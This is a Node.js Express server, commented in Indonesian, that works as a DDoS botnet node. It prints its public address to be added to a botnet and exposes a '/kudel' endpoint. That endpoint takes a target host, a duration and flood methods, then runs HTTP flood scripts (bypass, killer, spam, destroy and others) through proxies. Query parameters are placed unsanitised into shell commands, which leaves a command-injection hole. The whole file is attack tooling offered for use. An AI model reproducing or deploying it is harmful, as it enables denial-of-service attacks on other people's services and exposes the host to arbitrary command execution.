const express = require('express');
const { exec } = require('child_process');
const axios = require('axios');

const app = express();
const port = process.env.PORT || process.env.SERVER_PORT || 5032;

// Fungsi untuk mengambil data dari API
async function fetchData() {
  try {
    const response = await axios.get('https://httpbin.org/get');
    const data = response.data;
    console.log(`Copy This Add To Botnet -> http://${data.origin}:${port}`);
    return data;
  } catch (error) {
    console.error('Error fetching data:', error);
  }
}

// Endpoint untuk menerima request serangan
app.get('/kudel', (req, res) => {
  const { host, port, time, methods } = req.query;

  // Validasi parameter
  if (!host || !port || !time || !methods) {
    return res.status(400).json({
      error: 'Missing required parameters'
    });
  }

  // Respon ke client
  res.status(200).json({
    message: 'API request received. Executing script shortly.',
    target: host,
    time,
    methods
  });

  console.log(`Received attack request: Method ${methods}, Target ${host}, Duration ${time}s`);

  // Daftar metode serangan
  const attackMethods = {
    'http-bypass': `node ./lib/cache/https-bypass.js ${host} ${time} 90 1 proxy.txt bypass`,
    'http-killer': `node ./lib/cache/https-killer.js ${host} ${time} 90 1 proxy.txt`,
    'http-spam': `node ./lib/cache/https-spam.js ${host} ${time} 90 1 proxy.txt --bfm true --cookie true`,
    'http-destroy': `node ./lib/cache/https-destroy.js ${host} ${time} 1 90 proxy.txt --verison 1`,
    'https-star': `node ./lib/cache/https-star.js ${host} ${time} 90 1 proxy.txt`,
    'https-light': `node ./lib/cache/https-light.js ${host} ${time} 90 1 proxy.txt`,
    'https-super': `node ./lib/cache/https-super.js ${host} ${time} 90 1 proxy.txt flood`
  };

  // Fungsi untuk mengeksekusi perintah
  const executeCommand = (command) => {
    exec(command, (error, stdout, stderr) => {
      if (error) {
        console.error(`Execution error: ${error.message}`);
        return;
      }
      if (stderr) {
        console.error(`Stderr: ${stderr}`);
        return;
      }
      console.log(`Executed: ${command}`);
      console.log(`Output: ${stdout}`);
    });
  };

  // Cek jika methods adalah mix (format: method1+method2+method3)
  if (methods.includes('+')) {
    const methodList = methods.split('+');
    
    // Batasi maksimal 3 metode
    const selectedMethods = methodList.slice(0, 5).map(method => attackMethods[method]).filter(Boolean);
    
    if (selectedMethods.length > 0) {
      console.log(`Executing mix of ${selectedMethods.length} methods...`);
      selectedMethods.forEach(executeCommand);
    } else {
      console.log('No valid methods found in mix');
    }
  } else {
    // Eksekusi metode tunggal
    const selectedMethod = attackMethods[methods];
    if (selectedMethod) {
      executeCommand(selectedMethod);
    } else {
      console.log(`Unsupported method: ${methods}`);
    }
  }
});

// Jalankan server
app.listen(port, () => {
  console.log(`Server running on port ${port}`);
  fetchData();
});